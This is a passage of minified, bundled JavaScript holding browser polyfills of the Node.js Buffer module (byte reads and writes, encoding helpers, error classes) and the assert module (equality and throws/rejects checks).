                        case "ascii":
                        case "latin1":
                        case "binary":
                            return k(this, e, t, n);
                        case "base64":
                            return _(this, e, t, n);
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return E(this, e, t, n);
                        default:
                            if (o) throw new TypeError("Unknown encoding: " + r);
                            r = ("" + r).toLowerCase(), o = !0
                    }
                }, u.prototype.toJSON = function() {
                    return {
                        type: "Buffer",
                        data: Array.prototype.slice.call(this._arr || this, 0)
                    }
                };
                const x = 4096;

                function M(e, t, n) {
                    let r = "";
                    n = Math.min(e.length, n);
                    for (let i = t; i < n; ++i) r += String.fromCharCode(127 & e[i]);
                    return r
                }

                function B(e, t, n) {
                    let r = "";
                    n = Math.min(e.length, n);
                    for (let i = t; i < n; ++i) r += String.fromCharCode(e[i]);
                    return r
                }

                function T(e, t, n) {
                    const r = e.length;
                    (!t || t < 0) && (t = 0), (!n || n < 0 || n > r) && (n = r);
                    let i = "";
                    for (let o = t; o < n; ++o) i += J[e[o]];
                    return i
                }

                function O(e, t, n) {
                    const r = e.slice(t, n);
                    let i = "";
                    for (let o = 0; o < r.length - 1; o += 2) i += String.fromCharCode(r[o] + 256 * r[o + 1]);
                    return i
                }

                function C(e, t, n) {
                    if (e % 1 !== 0 || e < 0) throw new RangeError("offset is not uint");
                    if (e + t > n) throw new RangeError("Trying to access beyond buffer length")
                }

                function P(e, t, n, r, i, o) {
                    if (!u.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance');
                    if (t > i || t < o) throw new RangeError('"value" argument is out of bounds');
                    if (n + r > e.length) throw new RangeError("Index out of range")
                }

                function L(e, t, n, r, i) {
                    H(t, r, i, e, n, 7);
                    let o = Number(t & BigInt(4294967295));
                    e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o;
                    let s = Number(t >> BigInt(32) & BigInt(4294967295));
                    return e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, n
                }

                function N(e, t, n, r, i) {
                    H(t, r, i, e, n, 7);
                    let o = Number(t & BigInt(4294967295));
                    e[n + 7] = o, o >>= 8, e[n + 6] = o, o >>= 8, e[n + 5] = o, o >>= 8, e[n + 4] = o;
                    let s = Number(t >> BigInt(32) & BigInt(4294967295));
                    return e[n + 3] = s, s >>= 8, e[n + 2] = s, s >>= 8, e[n + 1] = s, s >>= 8, e[n] = s, n + 8
                }

                function R(e, t, n, r, i, o) {
                    if (n + r > e.length) throw new RangeError("Index out of range");
                    if (n < 0) throw new RangeError("Index out of range")
                }

                function D(e, t, n, r, o) {
                    return t = +t, n >>>= 0, o || R(e, 0, n, 4), i.write(e, t, n, r, 23, 4), n + 4
                }

                function z(e, t, n, r, o) {
                    return t = +t, n >>>= 0, o || R(e, 0, n, 8), i.write(e, t, n, r, 52, 8), n + 8
                }
                u.prototype.slice = function(e, t) {
                    const n = this.length;
                    (e = ~~e) < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n), (t = void 0 === t ? n : ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n), t < e && (t = e);
                    const r = this.subarray(e, t);
                    return Object.setPrototypeOf(r, u.prototype), r
                }, u.prototype.readUintLE = u.prototype.readUIntLE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e],
                        i = 1,
                        o = 0;
                    for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                    return r
                }, u.prototype.readUintBE = u.prototype.readUIntBE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e + --t],
                        i = 1;
                    for (; t > 0 && (i *= 256);) r += this[e + --t] * i;
                    return r
                }, u.prototype.readUint8 = u.prototype.readUInt8 = function(e, t) {
                    return e >>>= 0, t || C(e, 1, this.length), this[e]
                }, u.prototype.readUint16LE = u.prototype.readUInt16LE = function(e, t) {
                    return e >>>= 0, t || C(e, 2, this.length), this[e] | this[e + 1] << 8
                }, u.prototype.readUint16BE = u.prototype.readUInt16BE = function(e, t) {
                    return e >>>= 0, t || C(e, 2, this.length), this[e] << 8 | this[e + 1]
                }, u.prototype.readUint32LE = u.prototype.readUInt32LE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3]
                }, u.prototype.readUint32BE = u.prototype.readUInt32BE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3])
                }, u.prototype.readBigUInt64LE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24,
                        i = this[++e] + 256 * this[++e] + 65536 * this[++e] + n * 2 ** 24;
                    return BigInt(r) + (BigInt(i) << BigInt(32))
                })), u.prototype.readBigUInt64BE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = t * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + this[++e],
                        i = this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n;
                    return (BigInt(r) << BigInt(32)) + BigInt(i)
                })), u.prototype.readIntLE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e],
                        i = 1,
                        o = 0;
                    for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                    return i *= 128, r >= i && (r -= Math.pow(2, 8 * t)), r
                }, u.prototype.readIntBE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = t,
                        i = 1,
                        o = this[e + --r];
                    for (; r > 0 && (i *= 256);) o += this[e + --r] * i;
                    return i *= 128, o >= i && (o -= Math.pow(2, 8 * t)), o
                }, u.prototype.readInt8 = function(e, t) {
                    return e >>>= 0, t || C(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
                }, u.prototype.readInt16LE = function(e, t) {
                    e >>>= 0, t || C(e, 2, this.length);
                    const n = this[e] | this[e + 1] << 8;
                    return 32768 & n ? 4294901760 | n : n
                }, u.prototype.readInt16BE = function(e, t) {
                    e >>>= 0, t || C(e, 2, this.length);
                    const n = this[e + 1] | this[e] << 8;
                    return 32768 & n ? 4294901760 | n : n
                }, u.prototype.readInt32LE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24
                }, u.prototype.readInt32BE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]
                }, u.prototype.readBigInt64LE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = this[e + 4] + 256 * this[e + 5] + 65536 * this[e + 6] + (n << 24);
                    return (BigInt(r) << BigInt(32)) + BigInt(t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24)
                })), u.prototype.readBigInt64BE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = (t << 24) + 65536 * this[++e] + 256 * this[++e] + this[++e];
                    return (BigInt(r) << BigInt(32)) + BigInt(this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n)
                })), u.prototype.readFloatLE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), i.read(this, e, !0, 23, 4)
                }, u.prototype.readFloatBE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), i.read(this, e, !1, 23, 4)
                }, u.prototype.readDoubleLE = function(e, t) {
                    return e >>>= 0, t || C(e, 8, this.length), i.read(this, e, !0, 52, 8)
                }, u.prototype.readDoubleBE = function(e, t) {
                    return e >>>= 0, t || C(e, 8, this.length), i.read(this, e, !1, 52, 8)
                }, u.prototype.writeUintLE = u.prototype.writeUIntLE = function(e, t, n, r) {
                    if (e = +e, t >>>= 0, n >>>= 0, !r) {
                        P(this, e, t, n, Math.pow(2, 8 * n) - 1, 0)
                    }
                    let i = 1,
                        o = 0;
                    for (this[t] = 255 & e; ++o < n && (i *= 256);) this[t + o] = e / i & 255;
                    return t + n
                }, u.prototype.writeUintBE = u.prototype.writeUIntBE = function(e, t, n, r) {
                    if (e = +e, t >>>= 0, n >>>= 0, !r) {
                        P(this, e, t, n, Math.pow(2, 8 * n) - 1, 0)
                    }
                    let i = n - 1,
                        o = 1;
                    for (this[t + i] = 255 & e; --i >= 0 && (o *= 256);) this[t + i] = e / o & 255;
                    return t + n
                }, u.prototype.writeUint8 = u.prototype.writeUInt8 = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 1, 255, 0), this[t] = 255 & e, t + 1
                }, u.prototype.writeUint16LE = u.prototype.writeUInt16LE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 2, 65535, 0), this[t] = 255 & e, this[t + 1] = e >>> 8, t + 2
                }, u.prototype.writeUint16BE = u.prototype.writeUInt16BE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 2, 65535, 0), this[t] = e >>> 8, this[t + 1] = 255 & e, t + 2
                }, u.prototype.writeUint32LE = u.prototype.writeUInt32LE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 4, 4294967295, 0), this[t + 3] = e >>> 24, this[t + 2] = e >>> 16, this[t + 1] = e >>> 8, this[t] = 255 & e, t + 4
                }, u.prototype.writeUint32BE = u.prototype.writeUInt32BE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 4, 4294967295, 0), this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e, t + 4
                }, u.prototype.writeBigUInt64LE = X((function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                    return L(this, e, t, BigInt(0), BigInt("0xffffffffffffffff"))
                })), u.prototype.writeBigUInt64BE = X((function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                    return N(this, e, t, BigInt(0), BigInt("0xffffffffffffffff"))
                })), u.prototype.writeIntLE = function(e, t, n, r) {
                    if (e = +e, t >>>= 0, !r) {
                        const r = Math.pow(2, 8 * n - 1);
                        P(this, e, t, n, r - 1, -r)
                    }
                    let i = 0,
                        o = 1,
                        s = 0;
                    for (this[t] = 255 & e; ++i < n && (o *= 256);) e < 0 && 0 === s && 0 !== this[t + i - 1] && (s = 1), this[t + i] = (e / o >> 0) - s & 255;
                    return t + n
                }, u.prototype.writeIntBE = function(e, t, n, r) {
                    if (e = +e, t >>>= 0, !r) {
                        const r = Math.pow(2, 8 * n - 1);
                        P(this, e, t, n, r - 1, -r)
                    }
                    let i = n - 1,
                        o = 1,
                        s = 0;
                    for (this[t + i] = 255 & e; --i >= 0 && (o *= 256);) e < 0 && 0 === s && 0 !== this[t + i + 1] && (s = 1), this[t + i] = (e / o >> 0) - s & 255;
                    return t + n
                }, u.prototype.writeInt8 = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 1, 127, -128), e < 0 && (e = 255 + e + 1), this[t] = 255 & e, t + 1
                }, u.prototype.writeInt16LE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 2, 32767, -32768), this[t] = 255 & e, this[t + 1] = e >>> 8, t + 2
                }, u.prototype.writeInt16BE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 2, 32767, -32768), this[t] = e >>> 8, this[t + 1] = 255 & e, t + 2
                }, u.prototype.writeInt32LE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 4, 2147483647, -2147483648), this[t] = 255 & e, this[t + 1] = e >>> 8, this[t + 2] = e >>> 16, this[t + 3] = e >>> 24, t + 4
                }, u.prototype.writeInt32BE = function(e, t, n) {
                    return e = +e, t >>>= 0, n || P(this, e, t, 4, 2147483647, -2147483648), e < 0 && (e = 4294967295 + e + 1), this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e, t + 4
                }, u.prototype.writeBigInt64LE = X((function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                    return L(this, e, t, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
                })), u.prototype.writeBigInt64BE = X((function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                    return N(this, e, t, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
                })), u.prototype.writeFloatLE = function(e, t, n) {
                    return D(this, e, t, !0, n)
                }, u.prototype.writeFloatBE = function(e, t, n) {
                    return D(this, e, t, !1, n)
                }, u.prototype.writeDoubleLE = function(e, t, n) {
                    return z(this, e, t, !0, n)
                }, u.prototype.writeDoubleBE = function(e, t, n) {
                    return z(this, e, t, !1, n)
                }, u.prototype.copy = function(e, t, n, r) {
                    if (!u.isBuffer(e)) throw new TypeError("argument should be a Buffer");
                    if (n || (n = 0), r || 0 === r || (r = this.length), t >= e.length && (t = e.length), t || (t = 0), r > 0 && r < n && (r = n), r === n) return 0;
                    if (0 === e.length || 0 === this.length) return 0;
                    if (t < 0) throw new RangeError("targetStart out of bounds");
                    if (n < 0 || n >= this.length) throw new RangeError("Index out of range");
                    if (r < 0) throw new RangeError("sourceEnd out of bounds");
                    r > this.length && (r = this.length), e.length - t < r - n && (r = e.length - t + n);
                    const i = r - n;
                    return this === e && "function" === typeof Uint8Array.prototype.copyWithin ? this.copyWithin(t, n, r) : Uint8Array.prototype.set.call(e, this.subarray(n, r), t), i
                }, u.prototype.fill = function(e, t, n, r) {
                    if ("string" === typeof e) {
                        if ("string" === typeof t ? (r = t, t = 0, n = this.length) : "string" === typeof n && (r = n, n = this.length), void 0 !== r && "string" !== typeof r) throw new TypeError("encoding must be a string");
                        if ("string" === typeof r && !u.isEncoding(r)) throw new TypeError("Unknown encoding: " + r);
                        if (1 === e.length) {
                            const t = e.charCodeAt(0);
                            ("utf8" === r && t < 128 || "latin1" === r) && (e = t)
                        }
                    } else "number" === typeof e ? e &= 255 : "boolean" === typeof e && (e = Number(e));
                    if (t < 0 || this.length < t || this.length < n) throw new RangeError("Out of range index");
                    if (n <= t) return this;
                    let i;
                    if (t >>>= 0, n = void 0 === n ? this.length : n >>> 0, e || (e = 0), "number" === typeof e)
                        for (i = t; i < n; ++i) this[i] = e;
                    else {
                        const o = u.isBuffer(e) ? e : u.from(e, r),
                            s = o.length;
                        if (0 === s) throw new TypeError('The value "' + e + '" is invalid for argument "value"');
                        for (i = 0; i < n - t; ++i) this[i + t] = o[i % s]
                    }
                    return this
                };
                const U = {};

                function j(e, t, n) {
                    U[e] = class extends n {
                        constructor() {
                            super(), Object.defineProperty(this, "message", {
                                value: t.apply(this, arguments),
                                writable: !0,
                                configurable: !0
                            }), this.name = `${this.name} [${e}]`, this.stack, delete this.name
                        }
                        get code() {
                            return e
                        }
                        set code(e) {
                            Object.defineProperty(this, "code", {
                                configurable: !0,
                                enumerable: !0,
                                value: e,
                                writable: !0
                            })
                        }
                        toString() {
                            return `${this.name} [${e}]: ${this.message}`
                        }
                    }
                }

                function F(e) {
                    let t = "",
                        n = e.length;
                    const r = "-" === e[0] ? 1 : 0;
                    for (; n >= r + 4; n -= 3) t = `_${e.slice(n-3,n)}${t}`;
                    return `${e.slice(0,n)}${t}`
                }

                function H(e, t, n, r, i, o) {
                    if (e > n || e < t) {
                        const r = "bigint" === typeof t ? "n" : "";
                        let i;
                        throw i = o > 3 ? 0 === t || t === BigInt(0) ? `>= 0${r} and < 2${r} ** ${8*(o+1)}${r}` : `>= -(2${r} ** ${8*(o+1)-1}${r}) and < 2 ** ${8*(o+1)-1}${r}` : `>= ${t}${r} and <= ${n}${r}`, new U.ERR_OUT_OF_RANGE("value", i, e)
                    }! function(e, t, n) {
                        W(t, "offset"), void 0 !== e[t] && void 0 !== e[t + n] || K(t, e.length - (n + 1))
                    }(r, i, o)
                }

                function W(e, t) {
                    if ("number" !== typeof e) throw new U.ERR_INVALID_ARG_TYPE(t, "number", e)
                }

                function K(e, t, n) {
                    if (Math.floor(e) !== e) throw W(e, n), new U.ERR_OUT_OF_RANGE(n || "offset", "an integer", e);
                    if (t < 0) throw new U.ERR_BUFFER_OUT_OF_BOUNDS;
                    throw new U.ERR_OUT_OF_RANGE(n || "offset", `>= ${n?1:0} and <= ${t}`, e)
                }
                j("ERR_BUFFER_OUT_OF_BOUNDS", (function(e) {
                    return e ? `${e} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
                }), RangeError), j("ERR_INVALID_ARG_TYPE", (function(e, t) {
                    return `The "${e}" argument must be of type number. Received type ${typeof t}`
                }), TypeError), j("ERR_OUT_OF_RANGE", (function(e, t, n) {
                    let r = `The value of "${e}" is out of range.`,
                        i = n;
                    return Number.isInteger(n) && Math.abs(n) > 2 ** 32 ? i = F(String(n)) : "bigint" === typeof n && (i = String(n), (n > BigInt(2) ** BigInt(32) || n < -(BigInt(2) ** BigInt(32))) && (i = F(i)), i += "n"), r += ` It must be ${t}. Received ${i}`, r
                }), RangeError);
                const q = /[^+/0-9A-Za-z-_]/g;

                function V(e, t) {
                    let n;
                    t = t || 1 / 0;
                    const r = e.length;
                    let i = null;
                    const o = [];
                    for (let s = 0; s < r; ++s) {
                        if (n = e.charCodeAt(s), n > 55295 && n < 57344) {
                            if (!i) {
                                if (n > 56319) {
                                    (t -= 3) > -1 && o.push(239, 191, 189);
                                    continue
                                }
                                if (s + 1 === r) {
                                    (t -= 3) > -1 && o.push(239, 191, 189);
                                    continue
                                }
                                i = n;
                                continue
                            }
                            if (n < 56320) {
                                (t -= 3) > -1 && o.push(239, 191, 189), i = n;
                                continue
                            }
                            n = 65536 + (i - 55296 << 10 | n - 56320)
                        } else i && (t -= 3) > -1 && o.push(239, 191, 189);
                        if (i = null, n < 128) {
                            if ((t -= 1) < 0) break;
                            o.push(n)
                        } else if (n < 2048) {
                            if ((t -= 2) < 0) break;
                            o.push(n >> 6 | 192, 63 & n | 128)
                        } else if (n < 65536) {
                            if ((t -= 3) < 0) break;
                            o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128)
                        } else {
                            if (!(n < 1114112)) throw new Error("Invalid code point");
                            if ((t -= 4) < 0) break;
                            o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128)
                        }
                    }
                    return o
                }

                function Q(e) {
                    return r.toByteArray(function(e) {
                        if ((e = (e = e.split("=")[0]).trim().replace(q, "")).length < 2) return "";
                        for (; e.length % 4 !== 0;) e += "=";
                        return e
                    }(e))
                }

                function G(e, t, n, r) {
                    let i;
                    for (i = 0; i < r && !(i + n >= t.length || i >= e.length); ++i) t[i + n] = e[i];
                    return i
                }

                function Y(e, t) {
                    return e instanceof t || null != e && null != e.constructor && null != e.constructor.name && e.constructor.name === t.name
                }

                function Z(e) {
                    return e !== e
                }
                const J = function() {
                    const e = "0123456789abcdef",
                        t = new Array(256);
                    for (let n = 0; n < 16; ++n) {
                        const r = 16 * n;
                        for (let i = 0; i < 16; ++i) t[r + i] = e[n] + e[i]
                    }
                    return t
                }();

                function X(e) {
                    return "undefined" === typeof BigInt ? $ : e
                }

                function $() {
                    throw new Error("BigInt not supported")
                }
            },
            8093: (e, t, n) => {
                "use strict";

                function r(e) {
                    return r = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function(e) {
                        return typeof e
                    } : function(e) {
                        return e && "function" === typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                    }, r(e)
                }
                var i, o, s = n(3372).codes,
                    a = s.ERR_AMBIGUOUS_ARGUMENT,
                    u = s.ERR_INVALID_ARG_TYPE,
                    c = s.ERR_INVALID_ARG_VALUE,
                    l = s.ERR_INVALID_RETURN_VALUE,
                    f = s.ERR_MISSING_ARGS,
                    h = n(4945),
                    d = n(9639).inspect,
                    p = n(9639).types,
                    y = p.isPromise,
                    g = p.isRegExp,
                    m = Object.assign ? Object.assign : n(887).assign,
                    w = Object.is ? Object.is : n(3454);
                new Map;

                function b() {
                    var e = n(6912);
                    i = e.isDeepEqual, o = e.isDeepStrictEqual
                }
                var v = !1,
                    A = e.exports = S,
                    k = {};

                function _(e) {
                    if (e.message instanceof Error) throw e.message;
                    throw new h(e)
                }

                function E(e, t, n, r) {
                    if (!n) {
                        var i = !1;
                        if (0 === t) i = !0, r = "No value argument passed to `assert.ok()`";
                        else if (r instanceof Error) throw r;
                        var o = new h({
                            actual: n,
                            expected: !0,
                            message: r,
                            operator: "==",
                            stackStartFn: e
                        });
                        throw o.generatedMessage = i, o
                    }
                }

                function S() {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    E.apply(void 0, [S, t.length].concat(t))
                }
                A.fail = function e(t, n, r, i, o) {
                    var s, a = arguments.length;
                    if (0 === a) s = "Failed";
                    else if (1 === a) r = t, t = void 0;
                    else {
                        if (!1 === v) {
                            v = !0;
                            var u = process.emitWarning ? process.emitWarning : console.warn.bind(console);
                            u("assert.fail() with more than one argument is deprecated. Please use assert.strictEqual() instead or only pass a message.", "DeprecationWarning", "DEP0094")
                        }
                        2 === a && (i = "!=")
                    }
                    if (r instanceof Error) throw r;
                    var c = {
                        actual: t,
                        expected: n,
                        operator: void 0 === i ? "fail" : i,
                        stackStartFn: o || e
                    };
                    void 0 !== r && (c.message = r);
                    var l = new h(c);
                    throw s && (l.message = s, l.generatedMessage = !0), l
                }, A.AssertionError = h, A.ok = S, A.equal = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    t != n && _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "==",
                        stackStartFn: e
                    })
                }, A.notEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    t == n && _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "!=",
                        stackStartFn: e
                    })
                }, A.deepEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    void 0 === i && b(), i(t, n) || _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "deepEqual",
                        stackStartFn: e
                    })
                }, A.notDeepEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    void 0 === i && b(), i(t, n) && _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "notDeepEqual",
                        stackStartFn: e
                    })
                }, A.deepStrictEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    void 0 === i && b(), o(t, n) || _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "deepStrictEqual",
                        stackStartFn: e
                    })
                }, A.notDeepStrictEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    void 0 === i && b();
                    o(t, n) && _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "notDeepStrictEqual",
                        stackStartFn: e
                    })
                }, A.strictEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    w(t, n) || _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "strictEqual",
                        stackStartFn: e
                    })
                }, A.notStrictEqual = function e(t, n, r) {
                    if (arguments.length < 2) throw new f("actual", "expected");
                    w(t, n) && _({
                        actual: t,
                        expected: n,
                        message: r,
                        operator: "notStrictEqual",
                        stackStartFn: e
                    })
                };
                var I = function e(t, n, r) {
                    var i = this;
                    ! function(e, t) {
                        if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                    }(this, e), n.forEach((function(e) {
                        e in t && (void 0 !== r && "string" === typeof r[e] && g(t[e]) && t[e].test(r[e]) ? i[e] = r[e] : i[e] = t[e])
                    }))
                };

                function x(e, t, n, r, i, s) {
                    if (!(n in e) || !o(e[n], t[n])) {
                        if (!r) {
                            var a = new I(e, i),
                                u = new I(t, i, e),
                                c = new h({
                                    actual: a,
                                    expected: u,
                                    operator: "deepStrictEqual",
                                    stackStartFn: s
                                });
                            throw c.actual = e, c.expected = t, c.operator = s.name, c
                        }
                        _({
                            actual: e,
                            expected: t,
                            message: r,
                            operator: s.name,
                            stackStartFn: s
                        })
                    }
                }

                function M(e, t, n, o) {
                    if ("function" !== typeof t) {
                        if (g(t)) return t.test(e);
                        if (2 === arguments.length) throw new u("expected", ["Function", "RegExp"], t);
                        if ("object" !== r(e) || null === e) {
                            var s = new h({
                                actual: e,
                                expected: t,
                                message: n,
                                operator: "deepStrictEqual",
                                stackStartFn: o
                            });
                            throw s.operator = o.name, s
                        }
                        var a = Object.keys(t);
                        if (t instanceof Error) a.push("name", "message");
                        else if (0 === a.length) throw new c("error", t, "may not be an empty object");
                        return void 0 === i && b(), a.forEach((function(r) {
                            "string" === typeof e[r] && g(t[r]) && t[r].test(e[r]) || x(e, t, r, n, a, o)
                        })), !0
                    }
                    return void 0 !== t.prototype && e instanceof t || !Error.isPrototypeOf(t) && !0 === t.call({}, e)
                }

                function B(e) {
                    if ("function" !== typeof e) throw new u("fn", "Function", e);
                    try {
                        e()
                    } catch (t) {
                        return t
                    }
                    return k
                }

                function T(e) {
                    return y(e) || null !== e && "object" === r(e) && "function" === typeof e.then && "function" === typeof e.catch
                }

                function O(e) {
                    return Promise.resolve().then((function() {
                        var t;
                        if ("function" === typeof e) {
                            if (!T(t = e())) throw new l("instance of Promise", "promiseFn", t)
                        } else {
                            if (!T(e)) throw new u("promiseFn", ["Function", "Promise"], e);
                            t = e
                        }
                        return Promise.resolve().then((function() {
                            return t
                        })).then((function() {
                            return k
                        })).catch((function(e) {
                            return e
                        }))
                    }))
                }

                function C(e, t, n, i) {
                    if ("string" === typeof n) {
                        if (4 === arguments.length) throw new u("error", ["Object", "Error", "Function", "RegExp"], n);
                        if ("object" === r(t) && null !== t) {
                            if (t.message === n) throw new a("error/message", 'The error message "'.concat(t.message, '" is identical to the message.'))
                        } else if (t === n) throw new a("error/message", 'The error "'.concat(t, '" is identical to the message.'));
                        i = n, n = void 0
                    } else if (null != n && "object" !== r(n) && "function" !== typeof n) throw new u("error", ["Object", "Error", "Function", "RegExp"], n);
                    if (t === k) {
                        var o = "";
                        n && n.name && (o += " (".concat(n.name, ")")), o += i ? ": ".concat(i) : ".";
                        var s = "rejects" === e.name ? "rejection" : "exception";
                        _({
                            actual: void 0,
                            expected: n,
                            operator: e.name,
                            message: "Missing expected ".concat(s).concat(o),
                            stackStartFn: e
                        })
                    }
                    if (n && !M(t, n, i, e)) throw t
                }

                function P(e, t, n, r) {
                    if (t !== k) {
                        if ("string" === typeof n && (r = n, n = void 0), !n || M(t, n)) {
                            var i = r ? ": ".concat(r) : ".",
                                o = "doesNotReject" === e.name ? "rejection" : "exception";
                            _({
                                actual: t,
                                expected: n,
                                operator: e.name,
                                message: "Got unwanted ".concat(o).concat(i, "\n") + 'Actual message: "'.concat(t && t.message, '"'),
                                stackStartFn: e
                            })
                        }
                        throw t
                    }
                }

                function L() {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    E.apply(void 0, [L, t.length].concat(t))
                }
                A.throws = function e(t) {
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    C.apply(void 0, [e, B(t)].concat(r))
                }, A.rejects = function e(t) {
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    return O(t).then((function(t) {
                        return C.apply(void 0, [e, t].concat(r))
                    }))
                }, A.doesNotThrow = function e(t) {
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    P.apply(void 0, [e, B(t)].concat(r))
                }, A.doesNotReject = function e(t) {
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    return O(t).then((function(t) {
                        return P.apply(void 0, [e, t].concat(r))
                    }))
                }, A.ifError = function e(t) {
                    if (null !== t && void 0 !== t) {
                        var n = "ifError got unwanted exception: ";
                        "object" === r(t) && "string" === typeof t.message ? 0 === t.message.length && t.constructor ? n += t.constructor.name : n += t.message : n += d(t);
                        var i = new h({
                                actual: t,
                                expected: null,
                                operator: "ifError",
                                message: n,
                                stackStartFn: e
                            }),
                            o = t.stack;
                        if ("string" === typeof o) {
                            var s = o.split("\n");
                            s.shift();
                            for (var a = i.stack.split("\n"), u = 0; u < s.length; u++) {
                                var c = a.indexOf(s[u]);
                                if (-1 !== c) {
                                    a = a.slice(0, c);
                                    break
                                }
                            }
                            i.stack = "".concat(a.join("\n"), "\n").concat(s.join("\n"))
                        }
                        throw i
                    }
                }, A.strict = m(L, A, {
                    equal: A.strictEqual,
                    deepEqual: A.deepStrictEqual,
                    notEqual: A.notStrictEqual,
                    notDeepEqual: A.notDeepStrictEqual
                }), A.strict.strict = A.strict
            },
            4945: (e, t, n) => {
                "use strict";

                function r(e, t, n) {
                    return t in e ? Object.defineProperty(e, t, {
                        value: n,
                        enumerable: !0,
                        configurable: !0,
                        writable: !0
                    }) : e[t] = n, e
                }

                function i(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
